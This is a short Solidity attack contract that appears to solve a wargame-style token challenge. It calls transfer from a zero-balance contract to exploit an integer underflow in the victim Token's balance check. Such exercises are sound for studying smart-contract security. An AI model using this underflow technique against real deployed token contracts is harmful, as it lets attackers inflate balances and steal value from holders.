// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Token.sol';

contract TokenAttack {

    Token public token;

    constructor(address _victim){
        token = Token(_victim);
    }

    function attackToken() public{
        token.transfer(msg.sender, 21);
    }
}